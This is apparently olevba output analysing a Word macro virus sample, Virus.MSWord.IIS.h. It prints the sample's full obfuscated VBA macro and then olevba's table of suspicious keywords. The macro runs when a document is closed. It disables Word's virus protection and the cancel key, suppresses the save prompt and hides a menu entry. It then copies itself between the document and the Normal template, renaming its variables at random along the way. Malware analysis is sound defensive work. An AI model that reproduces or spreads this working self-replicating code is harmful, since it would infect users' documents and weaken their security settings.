olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
�ÊœœÂË‡‰ˆŽ˜£• = NormalTemplate.VBProject.vbcomponents(1).codemodule.lines(1, 1)
If �ÊœœÂË‡‰ˆŽ˜£• = "Private Sub Document_Close()" Then
Set ¿¦ÅÆº = ActiveDocument
Set ¾Á�¼œ…¥¯‰¥§Á³ = NormalTemplate
••Æ� = 1
End If
�ÊœœÂË‡‰ˆŽ˜£• = ActiveDocument.VBProject.vbcomponents(1).codemodule.lines(1, 1)
If �ÊœœÂË‡‰ˆŽ˜£• = "Private Sub Document_Close()" Then
Set ¿¦ÅÆº = NormalTemplate
Set ¾Á�¼œ…¥¯‰¥§Á³ = ActiveDocument
••Æ� = ••Æ� + 2
End If
If ••Æ� = 3 Then Exit Sub
'�ÊœœÂË‡‰ˆŽ˜£•
'••Æ�
'¿¦ÅÆº
'¾Á�¼œ…¥¯‰¥§Á³
Application.Options.VirusProtection = False
'ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ
'´¨¢®º„¿» ½¯ À¸�
'¶ÄÄžÇÇÃ� ¢Â‘
'¬«Œ�›Ç’©·»ÊºÆ»
Application.EnableCancelKey = wdCancelDisabled
'‘˜»�Ã¶�’²„½‚–
'Ç¾¦�¼�ˆÀ¼¨Œ§­„‡
'ºŠ˜µ­¿»²¾‰�Â™›²•¶½´
'¦�¨ÉŽ�µ
' ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“
'„œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬
'§¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­
'�Š«¼½•›Æ�’´¯™š
Options.SaveNormalPrompt = False
'¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢
'¿…¡�¢¦§Å®—°
'–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ
'´¸´¤¡‡“™¯§Š¢
'ÅÂ¨�ÆšÀš‘–Ä¹
'…º½®‘”µˆ¥ª¼�§ËŠ¦
'»˜¨ˆ´–¼È™Å§–•©¤Œ¯
'Ëƒ
ReDim ¶ÄÄžÇÇÃ� ¢Â‘(25, 25)
Do Until ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ = ¾Á�¼œ…¥¯‰¥§Á³.VBProject.vbcomponents(1).codemodule.countoflines
ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ = ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ + 1
ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ = ¾Á�¼œ…¥¯‰¥§Á³.VBProject.vbcomponents(1).codemodule.lines(ºŠ˜µ­¿»²¾‰�Â™›²•¶½´, 1)
If Left(ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ, 1) = "'" Then
´¨¢®º„¿» ½¯ À¸� = ´¨¢®º„¿» ½¯ À¸� + 1
¶ÄÄžÇÇÃ� ¢Â‘(´¨¢®º„¿» ½¯ À¸�, 1) = Mid(ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ, 2, Len(ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ))
Randomize Timer
¬«Œ�›Ç’©·»ÊºÆ» = Int(Rnd * 20) + 2
For ‘˜»�Ã¶�’²„½‚– = 1 To ¬«Œ�›Ç’©·»ÊºÆ»
d = Int(Rnd * 74) + 130
Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ = Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ & Chr(d)
Next ‘˜»�Ã¶�’²„½‚–
¶ÄÄžÇÇÃ� ¢Â‘(´¨¢®º„¿» ½¯ À¸�, 2) = Ç¾¦�¼�ˆÀ¼¨Œ§­„‡
End If
Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ = ""
Loop
For ¦�¨ÉŽ�µ = 1 To 24
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ¶ÄÄžÇÇÃ� ¢Â‘(¦�¨ÉŽ�µ, 2)
For „œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬ = ¦�¨ÉŽ�µ + 1 To 24
If ¶ÄÄžÇÇÃ� ¢Â‘(„œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬, 2) =  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ Then
�Š«¼½•›Æ�’´¯™š = Int(Rnd * 71) + 130
¶ÄÄžÇÇÃ� ¢Â‘(„œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬, 2) = Chr(�Š«¼½•›Æ�’´¯™š)
End If
Next „œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬
For §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1 To 24
If ¶ÄÄžÇÇÃ� ¢Â‘(§¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­, 1) =  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ Then
�Š«¼½•›Æ�’´¯™š = Int(Rnd * 71) + 130
¶ÄÄžÇÇÃ� ¢Â‘(¦�¨ÉŽ�µ, 2) = Chr(�Š«¼½•›Æ�’´¯™š)
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ¶ÄÄžÇÇÃ� ¢Â‘(¦�¨ÉŽ�µ, 2)
End If
Next §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­
Next ¦�¨ÉŽ�µ
´¨¢®º„¿» ½¯ À¸� = 1
Do Until ´¨¢®º„¿» ½¯ À¸� = ¾Á�¼œ…¥¯‰¥§Á³.VBProject.vbcomponents(1).codemodule.countoflines
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ¾Á�¼œ…¥¯‰¥§Á³.VBProject.vbcomponents(1).codemodule.lines(´¨¢®º„¿» ½¯ À¸�, 1)
´¨¢®º„¿» ½¯ À¸� = ´¨¢®º„¿» ½¯ À¸� + 1
¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = Len( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“)
¿…¡�¢¦§Å®—° = 0
Do Until ¿…¡�¢¦§Å®—° >= ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢
¿…¡�¢¦§Å®—° = ¿…¡�¢¦§Å®—° + 1
¬«Œ�›Ç’©·»ÊºÆ» = Mid( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“, ¿…¡�¢¦§Å®—°, 1)
If Asc(¬«Œ�›Ç’©·»ÊºÆ») > 64 Then
var = var & Mid( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“, ¿…¡�¢¦§Å®—°, 1)
Else
»˜¨ˆ´–¼È™Å§–•©¤Œ¯:
If Len(var) > 0 Then
For –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ = 1 To 24
If ¶ÄÄžÇÇÃ� ¢Â‘(–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ, 1) = var Then
var = ¶ÄÄžÇÇÃ� ¢Â‘(–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ, 2)
¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = Len(¶ÄÄžÇÇÃ� ¢Â‘(–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ, 1))
If §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1 Then ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ - 1
´¸´¤¡‡“™¯§Š¢ = Mid( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“, 1, ¿…¡�¢¦§Å®—° - ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ - 1)
¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = Len( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“)
If §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1 Then
ÅÂ¨�ÆšÀš‘–Ä¹ = ""
Else
ÅÂ¨�ÆšÀš‘–Ä¹ = Mid( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“, ¿…¡�¢¦§Å®—°, ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢)
End If
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ´¸´¤¡‡“™¯§Š¢ & var & ÅÂ¨�ÆšÀš‘–Ä¹
¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = Len( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“)
¿…¡�¢¦§Å®—° = ¿…¡�¢¦§Å®—° + Len(var) - Len(¶ÄÄžÇÇÃ� ¢Â‘(–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ, 1))
Exit For
End If
Next –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ
End If
var = ""
If §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1 Then
§¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 0
GoTo …º½®‘”µˆ¥ª¼�§ËŠ¦
End If
End If
Loop
§¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1
GoTo »˜¨ˆ´–¼È™Å§–•©¤Œ¯
…º½®‘”µˆ¥ª¼�§ËŠ¦:
Ëƒ = Ëƒ &  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ & Chr(13)
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ""
Loop
Ëƒ = Ëƒ & " End Sub"
¿¦ÅÆº.VBProject.vbcomponents(1).codemodule.deletelines 1, ¿¦ÅÆº.VBProject.vbcomponents(1).codemodule.countoflines
¿¦ÅÆº.VBProject.vbcomponents(1).codemodule.addfromstring (Ëƒ)
 End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

